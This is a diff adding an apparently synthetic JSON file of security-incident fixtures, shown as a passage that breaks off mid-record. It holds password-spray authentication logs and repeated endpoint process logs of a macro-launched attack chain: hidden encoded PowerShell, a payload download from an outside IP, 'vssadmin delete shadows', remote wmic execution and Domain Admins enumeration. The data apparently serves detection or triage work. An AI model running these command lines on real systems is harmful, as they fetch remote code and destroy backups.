@@ -1,0 +1,847 @@
+{
+  "INC-2026-0501": {
+    "logs": [
+      "timestamp=2026-05-13T04:33:50.000Z event_type=auth source_ip=45.83.193.150 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:34:01.000Z event_type=auth source_ip=45.83.193.150 destination_user=user1@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:34:12.000Z event_type=auth source_ip=45.83.193.150 destination_user=user2@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:34:23.000Z event_type=auth source_ip=45.83.193.150 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:34:34.000Z event_type=auth source_ip=45.83.193.150 destination_user=user4@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:34:45.000Z event_type=auth source_ip=45.83.193.150 destination_user=user5@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:34:56.000Z event_type=auth source_ip=45.83.193.150 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:35:07.000Z event_type=auth source_ip=45.83.193.150 destination_user=user7@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:35:18.000Z event_type=auth source_ip=45.83.193.150 destination_user=user8@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:35:29.000Z event_type=auth source_ip=45.83.193.150 destination_user=unknown.user app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:35:40.000Z event_type=auth source_ip=45.83.193.150 destination_user=user10@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:35:51.000Z event_type=auth source_ip=45.83.193.150 destination_user=user11@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T04:36:02.000Z event_type=auth source_ip=45.83.193.150 destination_user=unknown.user app=\"Microsoft 365\" result=SUCCESS",
+      "timestamp=2026-05-13T04:36:13.000Z event_type=auth source_ip=45.83.193.150 destination_user=user13@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "45.83.193.150",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T04:35:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0502": {
+    "logs": [
+      "timestamp=2026-05-13T08:14:50.000Z event_type=auth source_ip=199.249.230.100 destination_user=service-scanner@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:15:01.000Z event_type=auth source_ip=199.249.230.100 destination_user=user1@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:15:12.000Z event_type=auth source_ip=199.249.230.100 destination_user=user2@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:15:23.000Z event_type=auth source_ip=199.249.230.100 destination_user=service-scanner@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:15:34.000Z event_type=auth source_ip=199.249.230.100 destination_user=user4@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:15:45.000Z event_type=auth source_ip=199.249.230.100 destination_user=user5@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:15:56.000Z event_type=auth source_ip=199.249.230.100 destination_user=service-scanner@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:16:07.000Z event_type=auth source_ip=199.249.230.100 destination_user=user7@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:16:18.000Z event_type=auth source_ip=199.249.230.100 destination_user=user8@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:16:29.000Z event_type=auth source_ip=199.249.230.100 destination_user=service-scanner@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:16:40.000Z event_type=auth source_ip=199.249.230.100 destination_user=user10@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:16:51.000Z event_type=auth source_ip=199.249.230.100 destination_user=user11@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T08:17:02.000Z event_type=auth source_ip=199.249.230.100 destination_user=service-scanner@contoso.com app=\"Microsoft 365\" result=SUCCESS",
+      "timestamp=2026-05-13T08:17:13.000Z event_type=auth source_ip=199.249.230.100 destination_user=user13@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "199.249.230.100",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T08:16:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0503": {
+    "logs": [
+      "timestamp=2026-05-13T07:43:50.000Z event_type=auth source_ip=10.4.5.114 destination_user=j.harrington@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:44:01.000Z event_type=auth source_ip=10.4.5.114 destination_user=user1@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:44:12.000Z event_type=auth source_ip=10.4.5.114 destination_user=user2@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:44:23.000Z event_type=auth source_ip=10.4.5.114 destination_user=j.harrington@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:44:34.000Z event_type=auth source_ip=10.4.5.114 destination_user=user4@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:44:45.000Z event_type=auth source_ip=10.4.5.114 destination_user=user5@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:44:56.000Z event_type=auth source_ip=10.4.5.114 destination_user=j.harrington@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:45:07.000Z event_type=auth source_ip=10.4.5.114 destination_user=user7@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:45:18.000Z event_type=auth source_ip=10.4.5.114 destination_user=user8@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:45:29.000Z event_type=auth source_ip=10.4.5.114 destination_user=j.harrington@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:45:40.000Z event_type=auth source_ip=10.4.5.114 destination_user=user10@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:45:51.000Z event_type=auth source_ip=10.4.5.114 destination_user=user11@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:46:02.000Z event_type=auth source_ip=10.4.5.114 destination_user=j.harrington@contoso.com app=\"Microsoft 365\" result=SUCCESS",
+      "timestamp=2026-05-13T07:46:13.000Z event_type=auth source_ip=10.4.5.114 destination_user=user13@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T07:45:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0504": {
+    "logs": [
+      "timestamp=2026-05-13T02:58:50.000Z event_type=auth source_ip=10.4.5.114 destination_user=ceo@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T02:59:01.000Z event_type=auth source_ip=10.4.5.114 destination_user=user1@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T02:59:12.000Z event_type=auth source_ip=10.4.5.114 destination_user=user2@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T02:59:23.000Z event_type=auth source_ip=10.4.5.114 destination_user=ceo@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T02:59:34.000Z event_type=auth source_ip=10.4.5.114 destination_user=user4@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T02:59:45.000Z event_type=auth source_ip=10.4.5.114 destination_user=user5@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T02:59:56.000Z event_type=auth source_ip=10.4.5.114 destination_user=ceo@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T03:00:07.000Z event_type=auth source_ip=10.4.5.114 destination_user=user7@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T03:00:18.000Z event_type=auth source_ip=10.4.5.114 destination_user=user8@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T03:00:29.000Z event_type=auth source_ip=10.4.5.114 destination_user=ceo@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T03:00:40.000Z event_type=auth source_ip=10.4.5.114 destination_user=user10@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T03:00:51.000Z event_type=auth source_ip=10.4.5.114 destination_user=user11@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T03:01:02.000Z event_type=auth source_ip=10.4.5.114 destination_user=ceo@contoso.com app=\"Microsoft 365\" result=SUCCESS",
+      "timestamp=2026-05-13T03:01:13.000Z event_type=auth source_ip=10.4.5.114 destination_user=user13@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T03:00:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0505": {
+    "logs": [
+      "timestamp=2026-05-13T07:40:50.000Z event_type=auth source_ip=10.4.5.114 destination_user=old.printer@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:41:01.000Z event_type=auth source_ip=10.4.5.114 destination_user=user1@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:41:12.000Z event_type=auth source_ip=10.4.5.114 destination_user=user2@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:41:23.000Z event_type=auth source_ip=10.4.5.114 destination_user=old.printer@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:41:34.000Z event_type=auth source_ip=10.4.5.114 destination_user=user4@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:41:45.000Z event_type=auth source_ip=10.4.5.114 destination_user=user5@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:41:56.000Z event_type=auth source_ip=10.4.5.114 destination_user=old.printer@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:42:07.000Z event_type=auth source_ip=10.4.5.114 destination_user=user7@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:42:18.000Z event_type=auth source_ip=10.4.5.114 destination_user=user8@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:42:29.000Z event_type=auth source_ip=10.4.5.114 destination_user=old.printer@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:42:40.000Z event_type=auth source_ip=10.4.5.114 destination_user=user10@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:42:51.000Z event_type=auth source_ip=10.4.5.114 destination_user=user11@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password",
+      "timestamp=2026-05-13T07:43:02.000Z event_type=auth source_ip=10.4.5.114 destination_user=old.printer@contoso.com app=\"Microsoft 365\" result=SUCCESS",
+      "timestamp=2026-05-13T07:43:13.000Z event_type=auth source_ip=10.4.5.114 destination_user=user13@contoso.com app=\"Microsoft 365\" result=FAIL failure_reason=invalid_password"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T07:42:00Z",
+      "riskScore": "low",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0506": {
+    "logs": [
+      "timestamp=2026-05-13T09:48:00.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=j.harrington parent_process=explorer.exe",
+      "timestamp=2026-05-13T09:48:12.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=j.harrington parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T09:48:24.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=j.harrington parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T09:48:36.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=j.harrington parent_process=powershell.exe",
+      "timestamp=2026-05-13T09:48:48.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=j.harrington parent_process=powershell.exe",
+      "timestamp=2026-05-13T09:49:00.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=j.harrington parent_process=svchost.exe",
+      "timestamp=2026-05-13T09:49:12.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=j.harrington parent_process=nmap.exe",
+      "timestamp=2026-05-13T09:49:24.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=j.harrington parent_process=wmic.exe",
+      "timestamp=2026-05-13T09:49:36.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=j.harrington parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T09:49:48.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=j.harrington parent_process=whoami.exe",
+      "timestamp=2026-05-13T09:50:00.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T09:48:30Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0507": {
+    "logs": [
+      "timestamp=2026-05-13T09:51:00.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T09:51:12.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T09:51:24.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T09:51:36.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T09:51:48.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T09:52:00.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T09:52:12.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T09:52:24.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T09:52:36.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T09:52:48.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T09:53:00.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T09:51:30Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0508": {
+    "logs": [
+      "timestamp=2026-05-13T10:02:30.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:02:42.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:02:54.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T10:03:06.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:03:18.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:03:30.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:03:42.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:03:54.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:04:06.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:04:18.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:04:30.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:03:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0509": {
+    "logs": [
+      "timestamp=2026-05-13T10:05:30.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:05:42.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:05:54.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T10:06:06.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:06:18.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:06:30.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:06:42.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:06:54.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:07:06.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:07:18.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:07:30.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:06:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0510": {
+    "logs": [
+      "timestamp=2026-05-13T10:04:30.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:04:42.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:04:54.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T10:05:06.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:05:18.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:05:30.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:05:42.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:05:54.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:06:06.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:06:18.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:06:30.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:05:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0511": {
+    "logs": [
+      "timestamp=2026-05-13T10:29:30.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:29:42.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:29:54.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T10:30:06.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:30:18.000Z event_type=process asset=WS-FIN-014 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T10:30:30.000Z event_type=process asset=WS-FIN-014 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T10:30:42.000Z event_type=process asset=WS-FIN-014 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T10:30:54.000Z event_type=process asset=WS-FIN-014 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T10:31:06.000Z event_type=process asset=WS-FIN-014 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T10:31:18.000Z event_type=process asset=WS-FIN-014 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T10:31:30.000Z event_type=network asset=WS-FIN-014 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:30:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0512": {
+    "logs": [
+      "timestamp=2026-05-13T10:33:00.000Z event_type=process asset=WS-FIN-014 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T10:33:12.000Z event_type=process asset=WS-FIN-014 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T10:33:24.000Z event_type=process asset=WS-FIN-014 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
